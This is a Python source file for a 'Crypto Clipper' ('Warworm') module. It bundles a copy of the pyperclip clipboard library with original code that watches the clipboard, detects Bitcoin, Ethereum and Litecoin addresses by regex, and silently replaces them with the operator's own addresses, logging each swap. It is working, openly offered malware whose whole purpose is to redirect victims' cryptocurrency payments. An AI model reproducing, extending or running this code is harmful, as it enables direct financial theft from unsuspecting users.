

#!/usr/bin/env python3
"""
Crypto Clipper Module v4.1

# Thank to pyperclip without him I cant make better and stable in crypto wallet clipper and I really learn alot from pyperclip resepect++
# https://github.com/asweigart/pyperclip



"""

# ==================== BEGIN PYGPERCLIP SOURCE ====================
"""
Pyperclip

A cross-platform clipboard module for Python, with copy & paste functions for plain text.
By Al Sweigart al@inventwithpython.com
BSD License

Usage:
  import pyperclip
  pyperclip.copy('The text to be copied to the clipboard.')
  spam = pyperclip.paste()

  if not pyperclip.is_available():
    print("Copy functionality unavailable!")

On Windows, no additional modules are needed.
On Mac, the pyobjc module is used, falling back to the pbcopy and pbpaste cli
    commands. (These commands should come with OS X.).
On Linux, install xclip, xsel, or wl-clipboard (for "wayland" sessions) via package manager.
For example, in Debian:
    sudo apt-get install xclip
    sudo apt-get install xsel
    sudo apt-get install wl-clipboard

Otherwise on Linux, you will need the qtpy or PyQt5 modules installed.

This module does not work with PyGObject yet.

Cygwin is currently not supported.

Security Note: This module runs programs with these names:
    - which
    - pbcopy
    - pbpaste
    - xclip
    - xsel
    - wl-copy/wl-paste
    - klipper
    - qdbus
A malicious user could rename or add programs with these names, tricking
Pyperclip into running them with whatever permissions the Python process has.

"""
__version__ = '1.11.0'

import base64
import contextlib
import ctypes
import os
import platform
import subprocess
import sys
import time
import warnings

from ctypes import c_size_t, sizeof, c_wchar_p, get_errno, c_wchar
from typing import Union, Optional


_IS_RUNNING_PYTHON_2 = sys.version_info[0] == 2  # type: bool

# For paste(): Python 3 uses str, Python 2 uses unicode.
if _IS_RUNNING_PYTHON_2:
    # mypy complains about `unicode` for Python 2, so we ignore the type error:
    _PYTHON_STR_TYPE = unicode  # type: ignore
else:
    _PYTHON_STR_TYPE = str

ENCODING = 'utf-8'  # type: str

try:
    # Use shutil.which() for Python 3+
    from shutil import which
    def _py3_executable_exists(name):  # type: (str) -> bool
        return bool(which(name))
    _executable_exists = _py3_executable_exists
except ImportError:
    # Use the "which" unix command for Python 2.7 and prior.
    def _py2_executable_exists(name):  # type: (str) -> bool
        return subprocess.call(['which', name],
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0
    _executable_exists = _py2_executable_exists

# Exceptions
class PyperclipException(RuntimeError):
    pass

class PyperclipWindowsException(PyperclipException):
    def __init__(self, message):
        message += " (%s)" % ctypes.WinError()
        super(PyperclipWindowsException, self).__init__(message)

class PyperclipTimeoutException(PyperclipException):
    pass


def init_osx_pbcopy_clipboard():
    def copy_osx_pbcopy(text):
        text = _PYTHON_STR_TYPE(text) # Converts non-str values to str.
        p = subprocess.Popen(['pbcopy', 'w'],
                             stdin=subprocess.PIPE, close_fds=True)
        p.communicate(input=text.encode(ENCODING))

    def paste_osx_pbcopy():
        p = subprocess.Popen(['pbpaste', 'r'],
                             stdout=subprocess.PIPE, close_fds=True)
        stdout, stderr = p.communicate()
        return stdout.decode(ENCODING)

    return copy_osx_pbcopy, paste_osx_pbcopy


def init_osx_pyobjc_clipboard():
    def copy_osx_pyobjc(text):
        '''Copy string argument to clipboard'''
        text = _PYTHON_STR_TYPE(text) # Converts non-str values to str.
        newStr = Foundation.NSString.stringWithString_(text).nsstring()
        newData = newStr.dataUsingEncoding_(Foundation.NSUTF8StringEncoding)
        board = AppKit.NSPasteboard.generalPasteboard()
        board.declareTypes_owner_([AppKit.NSStringPboardType], None)
        board.setData_forType_(newData, AppKit.NSStringPboardType)

    def paste_osx_pyobjc():
        "Returns contents of clipboard"
        board = AppKit.NSPasteboard.generalPasteboard()
        content = board.stringForType_(AppKit.NSStringPboardType)
        return content

    return copy_osx_pyobjc, paste_osx_pyobjc


def init_qt_clipboard():
    global QApplication
    # $DISPLAY should exist

    # Try to import from qtpy, but if that fails try PyQt5
    # try:
    #     from qtpy.QtWidgets import QApplication
    # except:
    #     from PyQt5.QtWidgets import QApplication

    app = QApplication.instance()
    if app is None:
        app = QApplication([])

    def copy_qt(text):
        text = _PYTHON_STR_TYPE(text) # Converts non-str values to str.
        cb = app.clipboard()
        cb.setText(text)

    def paste_qt():
        cb = app.clipboard()
        return _PYTHON_STR_TYPE(cb.text())

    return copy_qt, paste_qt


def init_xclip_clipboard():
    DEFAULT_SELECTION='c'
    PRIMARY_SELECTION='p'

    def copy_xclip(text, primary=False):
        text = _PYTHON_STR_TYPE(text) # Converts non-str values to str.
        selection=DEFAULT_SELECTION
        if primary:
            selection=PRIMARY_SELECTION
        p = subprocess.Popen(['xclip', '-selection', selection],
                             stdin=subprocess.PIPE, close_fds=True)
        p.communicate(input=text.encode(ENCODING))

    def paste_xclip(primary=False):
        selection=DEFAULT_SELECTION
        if primary:
            selection=PRIMARY_SELECTION
        p = subprocess.Popen(['xclip', '-selection', selection, '-o'],
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE,
                             close_fds=True)
        stdout, stderr = p.communicate()
        # Intentionally ignore extraneous output on stderr when clipboard is empty
        return stdout.decode(ENCODING)

    return copy_xclip, paste_xclip


def init_xsel_clipboard():
    DEFAULT_SELECTION='-b'
    PRIMARY_SELECTION='-p'

    def copy_xsel(text, primary=False):
        text = _PYTHON_STR_TYPE(text) # Converts non-str values to str.
        selection_flag = DEFAULT_SELECTION
        if primary:
            selection_flag = PRIMARY_SELECTION
        p = subprocess.Popen(['xsel', selection_flag, '-i'],
                             stdin=subprocess.PIPE, close_fds=True)
        p.communicate(input=text.encode(ENCODING))

    def paste_xsel(primary=False):
        selection_flag = DEFAULT_SELECTION
        if primary:
            selection_flag = PRIMARY_SELECTION
        p = subprocess.Popen(['xsel', selection_flag, '-o'],
                             stdout=subprocess.PIPE, close_fds=True)
        stdout, stderr = p.communicate()
        return stdout.decode(ENCODING)

    return copy_xsel, paste_xsel


def init_wl_clipboard():
    PRIMARY_SELECTION = "-p"

    def copy_wl(text, primary=False):
        text = _PYTHON_STR_TYPE(text)  # Converts non-str values to str.
        args = ["wl-copy"]
        if primary:
            args.append(PRIMARY_SELECTION)
        if not text:
            args.append('--clear')
            subprocess.check_call(args, close_fds=True)
        else:
            pass
            p = subprocess.Popen(args, stdin=subprocess.PIPE, close_fds=True)
            p.communicate(input=text.encode(ENCODING))

    def paste_wl(primary=False):
        args = ["wl-paste", "-n", "-t", "text"]
        if primary:
            args.append(PRIMARY_SELECTION)
        p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
        stdout, _stderr = p.communicate()
        return stdout.decode(ENCODING)

    return copy_wl, paste_wl


def init_klipper_clipboard():
    def copy_klipper(text):
        text = _PYTHON_STR_TYPE(text) # Converts non-str values to str.
        p = subprocess.Popen(
            ['qdbus', 'org.kde.klipper', '/klipper', 'setClipboardContents',
             text.encode(ENCODING)],
            stdin=subprocess.PIPE, close_fds=True)
        p.communicate(input=None)

    def paste_klipper():
        p = subprocess.Popen(
            ['qdbus', 'org.kde.klipper', '/klipper', 'getClipboardContents'],
            stdout=subprocess.PIPE, close_fds=True)
        stdout, stderr = p.communicate()

        # Workaround for https://bugs.kde.org/show_bug.cgi?id=342874
        # TODO: https://github.com/asweigart/pyperclip/issues/43
        clipboardContents = stdout.decode(ENCODING)
        # even if blank, Klipper will append a newline at the end
        assert len(clipboardContents) > 0
        # make sure that newline is there
        assert clipboardContents.endswith('\n')
        if clipboardContents.endswith('\n'):
            clipboardContents = clipboardContents[:-1]
        return clipboardContents

    return copy_klipper, paste_klipper


def init_dev_clipboard_clipboard():
    def copy_dev_clipboard(text):
        text = _PYTHON_STR_TYPE(text) # Converts non-str values to str.
        if text == '':
            warnings.warn('Pyperclip cannot copy a blank string to the clipboard on Cygwin. This is effectively a no-op.')
        if '\r' in text:
            warnings.warn('Pyperclip cannot handle \\r characters on Cygwin.')

        fo = open('/dev/clipboard', 'wt')
        fo.write(text)
        fo.close()

    def paste_dev_clipboard():
        fo = open('/dev/clipboard', 'rt')
        content = fo.read()
        fo.close()
        return content

    return copy_dev_clipboard, paste_dev_clipboard


def init_no_clipboard():
    class ClipboardUnavailable(object):

        def __call__(self, *args, **kwargs):
            additionalInfo = ''
            if sys.platform == 'linux':
                additionalInfo = '\nOn Linux, you can run `sudo apt-get install xclip`, `sudo apt-get install xselect` (on X11) or `sudo apt-get install wl-clipboard` (on Wayland) to install a copy/paste mechanism.'
            raise PyperclipException('Pyperclip could not find a copy/paste mechanism for your system. For more information, please visit https://pyperclip.readthedocs.io/en/latest/index.html#not-implemented-error' + additionalInfo)

        if _IS_RUNNING_PYTHON_2:
            def __nonzero__(self):
                return False
        else:
            def __bool__(self):
                return False

    return ClipboardUnavailable(), ClipboardUnavailable()




# Windows-related clipboard functions:
class CheckedCall(object):
    def __init__(self, f):
        super(CheckedCall, self).__setattr__("f", f)

    def __call__(self, *args):
        ret = self.f(*args)
        if not ret and get_errno():
            raise PyperclipWindowsException("Error calling " + self.f.__name__)
        return ret

    def __setattr__(self, key, value):
        setattr(self.f, key, value)


def init_windows_clipboard():
    global HGLOBAL, LPVOID, DWORD, LPCSTR, INT, HWND, HINSTANCE, HMENU, BOOL, UINT, HANDLE
    from ctypes.wintypes import (HGLOBAL, LPVOID, DWORD, LPCSTR, INT, HWND,
                                 HINSTANCE, HMENU, BOOL, UINT, HANDLE)

    windll = ctypes.windll
    msvcrt = ctypes.CDLL('msvcrt')

    safeCreateWindowExA = CheckedCall(windll.user32.CreateWindowExA)
    safeCreateWindowExA.argtypes = [DWORD, LPCSTR, LPCSTR, DWORD, INT, INT,
                                    INT, INT, HWND, HMENU, HINSTANCE, LPVOID]
    safeCreateWindowExA.restype = HWND

    safeDestroyWindow = CheckedCall(windll.user32.DestroyWindow)
    safeDestroyWindow.argtypes = [HWND]
    safeDestroyWindow.restype = BOOL

    OpenClipboard = windll.user32.OpenClipboard
    OpenClipboard.argtypes = [HWND]
    OpenClipboard.restype = BOOL

    safeCloseClipboard = CheckedCall(windll.user32.CloseClipboard)
    safeCloseClipboard.argtypes = []
    safeCloseClipboard.restype = BOOL

    safeEmptyClipboard = CheckedCall(windll.user32.EmptyClipboard)
    safeEmptyClipboard.argtypes = []
    safeEmptyClipboard.restype = BOOL

    safeGetClipboardData = CheckedCall(windll.user32.GetClipboardData)
    safeGetClipboardData.argtypes = [UINT]
    safeGetClipboardData.restype = HANDLE

    safeSetClipboardData = CheckedCall(windll.user32.SetClipboardData)
    safeSetClipboardData.argtypes = [UINT, HANDLE]
    safeSetClipboardData.restype = HANDLE

    safeGlobalAlloc = CheckedCall(windll.kernel32.GlobalAlloc)
    safeGlobalAlloc.argtypes = [UINT, c_size_t]
    safeGlobalAlloc.restype = HGLOBAL

    safeGlobalLock = CheckedCall(windll.kernel32.GlobalLock)
    safeGlobalLock.argtypes = [HGLOBAL]
    safeGlobalLock.restype = LPVOID

    safeGlobalUnlock = CheckedCall(windll.kernel32.GlobalUnlock)
    safeGlobalUnlock.argtypes = [HGLOBAL]
    safeGlobalUnlock.restype = BOOL

    wcslen = CheckedCall(msvcrt.wcslen)
    wcslen.argtypes = [c_wchar_p]
    wcslen.restype = UINT

    GMEM_MOVEABLE = 0x0002
    CF_UNICODETEXT = 13

    @contextlib.contextmanager
    def window():
        """
        Context that provides a valid Windows hwnd.
        """
        # we really just need the hwnd, so setting "STATIC"
        # as predefined lpClass is just fine.
        hwnd = safeCreateWindowExA(0, b"STATIC", None, 0, 0, 0, 0, 0,
                                   None, None, None, None)
        try:
            yield hwnd
        finally:
            safeDestroyWindow(hwnd)

    @contextlib.contextmanager
    def clipboard(hwnd):
        """
        Context manager that opens the clipboard and prevents
        other applications from modifying the clipboard content.
        """
        # We may not get the clipboard handle immediately because
        # some other application is accessing it (?)
        # We try for at least 500ms to get the clipboard.
        t = time.time() + 0.5
        success = False
        while time.time() < t:
            success = OpenClipboard(hwnd)
            if success:
                break
            time.sleep(0.01)
        if not success:
            raise PyperclipWindowsException("Error calling OpenClipboard")

        try:
            yield
        finally:
            safeCloseClipboard()

    def copy_windows(text):
        # This function is heavily based on
        # http://msdn.com/ms649016#_win32_Copying_Information_to_the_Clipboard

        text = _PYTHON_STR_TYPE(text) # Converts non-str values to str.

        with window() as hwnd:
            # http://msdn.com/ms649048
            # If an application calls OpenClipboard with hwnd set to NULL,
            # EmptyClipboard sets the clipboard owner to NULL;
            # this causes SetClipboardData to fail.
            # => We need a valid hwnd to copy something.
            with clipboard(hwnd):
                safeEmptyClipboard()

                if text:
                    # http://msdn.com/ms649051
                    # If the hMem parameter identifies a memory object,
                    # the object must have been allocated using the
                    # function with the GMEM_MOVEABLE flag.
                    count = wcslen(text) + 1
                    handle = safeGlobalAlloc(GMEM_MOVEABLE,
                                             count * sizeof(c_wchar))
                    locked_handle = safeGlobalLock(handle)

                    ctypes.memmove(c_wchar_p(locked_handle), c_wchar_p(text), count * sizeof(c_wchar))

                    safeGlobalUnlock(handle)
                    safeSetClipboardData(CF_UNICODETEXT, handle)

    def paste_windows():
        with clipboard(None):
            handle = safeGetClipboardData(CF_UNICODETEXT)
            if not handle:
                # GetClipboardData may return NULL with errno == NO_ERROR
                # if the clipboard is empty.
                # (Also, it may return a handle to an empty buffer,
                # but technically that's not empty)
                return ""
            locked_handle = safeGlobalLock(handle)
            return_value = c_wchar_p(locked_handle).value
            safeGlobalUnlock(handle)
            return return_value

    return copy_windows, paste_windows


def init_wsl_clipboard():

    def copy_wsl(text):
        text = _PYTHON_STR_TYPE(text) # Converts non-str values to str.
        p = subprocess.Popen(['clip.exe'],
                             stdin=subprocess.PIPE, close_fds=True)
        p.communicate(input=text.encode('utf-16le'))

    def paste_wsl():
        ps_script = '[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Clipboard -Raw)))'

        # '-noprofile' speeds up load time
        p = subprocess.Popen(['powershell.exe', '-noprofile', '-command', ps_script],
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE,
                             close_fds=True)
        stdout, stderr = p.communicate()

        if stderr:
            raise Exception(f"Error pasting from clipboard: {stderr}")

        try:
            base64_encoded = stdout.decode('utf-8').strip()
            decoded_bytes = base64.b64decode(base64_encoded)
            return decoded_bytes.decode('utf-8')
        except Exception as e:
            raise RuntimeError(f"Decoding error: {e}")

    return copy_wsl, paste_wsl


# Automatic detection of clipboard mechanisms and importing is done in determine_clipboard():
def determine_clipboard():
    '''
    Determine the OS/platform and set the copy() and paste() functions
    accordingly.
    '''

    global Foundation, AppKit, qtpy, PyQt5

    # Setup for the CYGWIN platform:
    if 'cygwin' in platform.system().lower(): # Cygwin has a variety of values returned by platform.system(), such as 'CYGWIN_NT-6.1'
        # FIXME: pyperclip currently does not support Cygwin,
        # see https://github.com/asweigart/pyperclip/issues/55
        if os.path.exists('/dev/clipboard'):
            warnings.warn('Pyperclip\'s support for Cygwin is not perfect, see https://github.com/asweigart/pyperclip/issues/55')
            return init_dev_clipboard_clipboard()

    # Setup for the WINDOWS platform:
    elif os.name == 'nt' or platform.system() == 'Windows':
        return init_windows_clipboard()

    if platform.system() == 'Linux' and os.path.isfile('/proc/version'):
        with open('/proc/version', 'r') as f:
            if "microsoft" in f.read().lower():
                return init_wsl_clipboard()

    # Setup for the MAC OS X platform:
    if os.name == 'mac' or platform.system() == 'Darwin':
        try:
            import Foundation  # check if pyobjc is installed
            import AppKit
        except ImportError:
            return init_osx_pbcopy_clipboard()
        else:
            return init_osx_pyobjc_clipboard()

    # Setup for the LINUX platform:

    if os.getenv("WAYLAND_DISPLAY") and _executable_exists("wl-copy")  and _executable_exists("wl-paste"):
        return init_wl_clipboard()

    # `import PyQt4` sys.exit()s if DISPLAY is not in the environment.
    # Thus, we need to detect the presence of $DISPLAY manually
    # and not load PyQt4 if it is absent.
    elif os.getenv("DISPLAY"):
        if _executable_exists("xclip"):
            # Note: 2024/06/18 Google Trends shows xclip as more popular than xsel.
            return init_xclip_clipboard()
        if _executable_exists("xsel"):
            return init_xsel_clipboard()
        if _executable_exists("klipper") and _executable_exists("qdbus"):
            return init_klipper_clipboard()

        try:
            # qtpy is a small abstraction layer that lets you write
            # applications using a single api call to either PyQt or PySide.
            # https://pypi.python.org/pypi/QtPy
            import qtpy  # check if qtpy is installed
            return init_qt_clipboard()
        except ImportError:
            pass

        # If qtpy isn't installed, fall back on importing PyQt5
        try:
            import PyQt5  # check if PyQt5 is installed
            return init_qt_clipboard()
        except ImportError:
            pass

    return init_no_clipboard()


def set_clipboard(clipboard):
    '''
    Explicitly sets the clipboard mechanism. The "clipboard mechanism" is how
    the copy() and paste() functions interact with the operating system to
    implement the copy/paste feature. The clipboard parameter must be one of:
        - pbcopy
        - pbobjc (default on Mac OS X)
        - qt
        - xclip
        - xsel
        - klipper
        - windows (default on Windows)
        - no (this is what is set when no clipboard mechanism can be found)
    '''
    global copy, paste

    clipboard_types = {
        "pbcopy": init_osx_pbcopy_clipboard,
        "pyobjc": init_osx_pyobjc_clipboard,
        "qt": init_qt_clipboard,  # TODO - split this into 'qtpy' and 'pyqt5'
        "xclip": init_xclip_clipboard,
        "xsel": init_xsel_clipboard,
        "wl-clipboard": init_wl_clipboard,
        "klipper": init_klipper_clipboard,
        "windows": init_windows_clipboard,
        "no": init_no_clipboard,
    }

    if clipboard not in clipboard_types:
        raise ValueError('Argument must be one of %s' % (', '.join([repr(_) for _ in clipboard_types.keys()])))

    # Sets pyperclip's copy() and paste() functions:
    copy, paste = clipboard_types[clipboard]()


def lazy_load_stub_copy(text):
    '''
    A stub function for copy(), which will load the real copy() function when
    called so that the real copy() function is used for later calls.

    This allows users to import pyperclip without having determine_clipboard()
    automatically run, which will automatically select a clipboard mechanism.
    This could be a problem if it selects, say, the memory-heavy PyQt5 module
    but the user was just going to immediately call set_clipboard() to use a
    different clipboard mechanism.

    The lazy loading this stub function implements gives the user a chance to
    call set_clipboard() to pick another clipboard mechanism. Or, if the user
    simply calls copy() or paste() without calling set_clipboard() first,
    will fall back on whatever clipboard mechanism that determine_clipboard()
    automatically chooses.
    '''
    global copy, paste
    copy, paste = determine_clipboard()
    return copy(text)


def lazy_load_stub_paste():
    '''
    A stub function for paste(), which will load the real paste() function when
    called so that the real paste() function is used for later calls.

    This allows users to import pyperclip without having determine_clipboard()
    automatically run, which will automatically select a clipboard mechanism.
    This could be a problem if it selects, say, the memory-heavy PyQt5 module
    but the user was just going to immediately call set_clipboard() to use a
    different clipboard mechanism.

    The lazy loading this stub function implements gives the user a chance to
    call set_clipboard() to pick another clipboard mechanism. Or, if the user
    simply calls copy() or paste() without calling set_clipboard() first,
    will fall back on whatever clipboard mechanism that determine_clipboard()
    automatically chooses.
    '''
    global copy, paste
    copy, paste = determine_clipboard()
    return paste()


def is_available():
    return copy != lazy_load_stub_copy and paste != lazy_load_stub_paste


# Initially, copy() and paste() are set to lazy loading wrappers which will
# set `copy` and `paste` to real functions the first time they're used, unless
# set_clipboard() or determine_clipboard() is called first.
copy, paste = lazy_load_stub_copy, lazy_load_stub_paste



__all__ = ['copy', 'paste', 'set_clipboard', 'determine_clipboard']
# ==================== END PYGPERCLIP SOURCE ====================

# ==================== YOUR CLIPPER CODE ====================
import re
import time
import sys
import os
import threading
import datetime
from collections import deque

# ENHANCED CRYPTO PATTERNS
CRYPTO_PATTERNS = {
    "Bitcoin": [
        r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
    ],
    "Ethereum": [
        r"^0x[a-fA-F0-9]{40}$",
    ],
    "Litecoin": [
        r"^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$",
        r"^(ltc1)[a-zA-HJ-NP-Z0-9]{39,59}$",
    ],
    # Add other crypto patterns as needed
}

class ClipboardTracker:
    """Tracks all clipboard activity for debugging"""
    
    def __init__(self, max_history=100):
        self.history = deque(maxlen=max_history)
        self.lock = threading.Lock()
        self.log_file = None
        self._setup_logging()
    
    def _setup_logging(self):
        try:
            log_dir = os.path.join(os.environ.get('TEMP', '/tmp'), 'tmpdb_logs')
            os.makedirs(log_dir, exist_ok=True)
            timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
            self.log_file = os.path.join(log_dir, f'clipper_debug_{timestamp}.log')
            with open(self.log_file, 'w', encoding='utf-8') as f:
                f.write(f"=== Warworm Crypto Clipper Debug Log ===\n")
                f.write(f"Started: {datetime.datetime.now().isoformat()}\n")
                f.write(f"PID: {os.getpid()}\n")
                f.write("="*60 + "\n\n")
        except Exception as e:
            print(f"[!] Log setup error: {e}")
    
    def log(self, message, level="INFO"):
        timestamp = datetime.datetime.now().strftime('%H:%M:%S.%f')[:-3]
        log_line = f"[{timestamp}] [{level}] {message}"
        print(log_line)
        if self.log_file:
            try:
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(log_line + "\n")
            except:
                pass
    
    def track_clipboard_change(self, text, detected_crypto=None, replaced=False):
        entry = {
            'timestamp': datetime.datetime.now().isoformat(),
            'text_preview': text[:50] + "..." if len(text) > 50 else text,
            'text_length': len(text),
            'detected_crypto': detected_crypto,
            'replaced': replaced,
            'full_text': text
        }
        with self.lock:
            self.history.append(entry)
        if detected_crypto:
            if replaced:
                self.log(f"✓ REPLACED {detected_crypto}: {entry['text_preview']}", "SUCCESS")
            else:
                self.log(f"✗ Detected {detected_crypto} but NOT replaced (same as target)", "WARNING")
        else:
            self.log(f"Clipboard changed: {entry['text_preview']}", "DEBUG")
    
    def get_stats(self):
        with self.lock:
            total = len(self.history)
            detected = sum(1 for e in self.history if e['detected_crypto'])
            replaced = sum(1 for e in self.history if e['replaced'])
            crypto_counts = {}
            for e in self.history:
                if e['detected_crypto']:
                    crypto_counts[e['detected_crypto']] = crypto_counts.get(e['detected_crypto'], 0) + 1
            return {
                'total_changes': total,
                'detected_crypto': detected,
                'replaced': replaced,
                'crypto_breakdown': crypto_counts,
                'recent_history': list(self.history)[-10:]
            }

class CryptoClipper:
    def __init__(self, addresses: dict):
        self.addresses = {k: v.strip() for k, v in addresses.items() if v and v.strip()}
        self.running = False
        self.last_text = ""
        self.monitor_thread = None
        self.tracker = ClipboardTracker()
        self.replacement_count = 0
        self.detection_count = 0
        self.tracker.log(f"Clipper initialized with {len(self.addresses)} addresses: {list(self.addresses.keys())}")
    
    def check_crypto_address(self, text):
        if not text:
            return None, None
        text = text.strip()
        if len(text) < 20 or len(text) > 150:
            return None, None
        for crypto_name, patterns in CRYPTO_PATTERNS.items():
            if isinstance(patterns, str):
                patterns = [patterns]
            for pattern in patterns:
                try:
                    if re.match(pattern, text):
                        replacement = self.addresses.get(crypto_name)
                        self.tracker.log(
                            f"DETECTED {crypto_name}: {text[:20]}... "
                            f"(Pattern: {pattern[:30]}...) "
                            f"Has replacement: {bool(replacement)}",
                            "DETECT"
                        )
                        return crypto_name, replacement
                except Exception as e:
                    self.tracker.log(f"Regex error for {crypto_name}: {e}", "ERROR")
        return None, None
    
    def _monitor_loop(self):
        self.tracker.log("="*60)
        self.tracker.log("MONITOR LOOP STARTED (using embedded pyperclip)")
        self.tracker.log("="*60)
        consecutive_errors = 0
        while self.running:
            try:
                # Read clipboard via pyperclip's paste() function
                current = paste()  # <-- using pyperclip's paste
                if current and current != self.last_text:
                    crypto_type, replacement = self.check_crypto_address(current)
                    if crypto_type and replacement:
                        self.detection_count += 1
                        if current.strip() != replacement.strip():
                            time.sleep(0.05)
                            try:
                                copy(replacement)  # <-- using pyperclip's copy
                                self.replacement_count += 1
                                self.last_text = replacement
                                self.tracker.track_clipboard_change(
                                    current, detected_crypto=crypto_type, replaced=True
                                )
                                self.tracker.log(
                                    f"✓✓✓ SUCCESSFULLY REPLACED {crypto_type} ✓✓✓",
                                    "REPLACEMENT"
                                )
                                self.tracker.log(f"  Original: {current[:30]}...", "REPLACEMENT")
                                self.tracker.log(f"  New:      {replacement[:30]}...", "REPLACEMENT")
                            except Exception as e:
                                self.last_text = current
                                self.tracker.track_clipboard_change(
                                    current, detected_crypto=crypto_type, replaced=False
                                )
                                self.tracker.log(f"✗ Failed to set clipboard: {e}", "ERROR")
                        else:
                            self.last_text = current
                            self.tracker.track_clipboard_change(
                                current, detected_crypto=crypto_type, replaced=False
                            )
                    else:
                        self.last_text = current
                        self.tracker.track_clipboard_change(current)
                consecutive_errors = 0
                time.sleep(0.1)
            except KeyboardInterrupt:
                self.tracker.log("Interrupted by user", "INFO")
                break
            except Exception as e:
                consecutive_errors += 1
                self.tracker.log(f"Monitor error #{consecutive_errors}: {e}", "ERROR")
                if consecutive_errors > 10:
                    self.tracker.log("Too many errors, stopping monitor", "ERROR")
                    break
                time.sleep(0.5)
        self.running = False
        self.tracker.log("="*60)
        self.tracker.log("MONITOR LOOP STOPPED")
        self.tracker.log("="*60)
    
    def start(self):
        if not self.addresses:
            self.tracker.log("No addresses configured, cannot start", "ERROR")
            return False
        if self.running:
            self.tracker.log("Clipper already running", "WARNING")
            return True
        self.running = True
        self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=False)
        self.monitor_thread.start()
        self.tracker.log(f"[+] Clipper started with {len(self.addresses)} addresses")
        self.tracker.log(f"    Monitoring: {list(self.addresses.keys())}")
        self.tracker.log(f"    Log file: {self.tracker.log_file}")
        return True
    
    def stop(self):
        self.tracker.log("Stopping clipper...", "INFO")
        self.running = False
        if self.monitor_thread and self.monitor_thread.is_alive():
            self.monitor_thread.join(timeout=2.0)
        stats = self.get_stats()
        self.tracker.log("="*60, "STATS")
        self.tracker.log(f"Final Statistics:", "STATS")
        self.tracker.log(f"  Total detections: {stats['detection_count']}", "STATS")
        self.tracker.log(f"  Successful replacements: {stats['replacement_count']}", "STATS")
        self.tracker.log(f"  Clipboard changes tracked: {stats['total_changes']}", "STATS")
        self.tracker.log("="*60, "STATS")
    
    def get_stats(self):
        tracker_stats = self.tracker.get_stats()
        return {
            "running": self.running,
            "addresses_configured": len(self.addresses),
            "addresses": list(self.addresses.keys()),
            "detection_count": self.detection_count,
            "replacement_count": self.replacement_count,
            "log_file": self.tracker.log_file,
            **tracker_stats
        }

# Global instance helpers (unchanged)
_global_clipper = None
def get_clipper(addresses=None):
    global _global_clipper
    if _global_clipper is None and addresses is not None:
        _global_clipper = CryptoClipper(addresses)
    return _global_clipper
def start_clipper(addresses: dict):
    clipper = get_clipper(addresses)
    if clipper:
        return clipper.start()
    return False
def stop_clipper():
    global _global_clipper
    if _global_clipper:
        _global_clipper.stop()
        _global_clipper = None
def get_clipper_stats():
    clipper = get_clipper()
    if clipper:
        return clipper.get_stats()
    return {"running": False, "addresses_configured": 0, "log_file": None}
def start_clipper_process(addresses: dict):
    return start_clipper(addresses)

# # === SELF-TEST FUNCTION (with valid addresses) ===
# def test_detection():
#     print("\n" + "="*60)
#     print("CRYPTO CLIPPER SELF-TEST")
#     print("="*60)
    
#     # Use real-looking test addresses (not your real ones)
#     test_addresses = {
#         "Bitcoin": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
#         "Ethereum": "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
#         "Litecoin": "LbTjMGN7gELw4KbeyQf6cTCq859hD18guE",
#     }
    
#     test_cases = [
#         ("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "Bitcoin Legacy"),
#         ("bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq", "Bitcoin Bech32"),
#         ("0x71C7656EC7ab88b098defB751B7401B5f6d8976F", "Ethereum"),
#         ("LbTjMGN7gELw4KbeyQf6cTCq859hD18guE", "Litecoin Legacy"),
#         ("ltc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", "Litecoin Bech32"),
#         ("NotAnAddress123", "Invalid"),
#         ("", "Empty"),
#         ("random text here", "Random text"),
#     ]
    
#     clipper = CryptoClipper(test_addresses)
    
#     for test_addr, desc in test_cases:
#         result = clipper.check_crypto_address(test_addr)
#         status = "✓ DETECTED" if result[0] else "✗ Not detected"
#         print(f"{status:20} | {desc:25} | {test_addr[:35]}...")
    
#     print("="*60)
#     print("Test complete.")
#     print("="*60 + "\n")

# # === MAIN ENTRY POINT ===
# if __name__ == "__main__":
#     import signal
#     import sys

#     # --- CONFIGURE YOUR ADDRESSES HERE ---
#     my_addresses = {
#         "Bitcoin": "1HCyDGKuzXZYB1eAERTMkNZzTwJRJqnpfW",   # <-- YOUR BTC ADDRESS
#         # "Ethereum": "0x...",   # add if needed
#         # "Litecoin": "ltc...",   # add if needed
#     }
#     # ------------------------------------

#     # Optional: run self-test first
#     test_detection()

#     clipper = CryptoClipper(my_addresses)

#     def signal_handler(sig, frame):
#         print("\n[!] Stopping clipper...")
#         clipper.stop()
#         sys.exit(0)

#     signal.signal(signal.SIGINT, signal_handler)

#     if clipper.start():
#         print("[+] Clipper is now running. Press Ctrl+C to stop.\n")
#         try:
#             while True:
#                 time.sleep(1)
#         except KeyboardInterrupt:
#             signal_handler(None, None)
#     else:
#         print("[!] Failed to start clipper. Check your addresses.")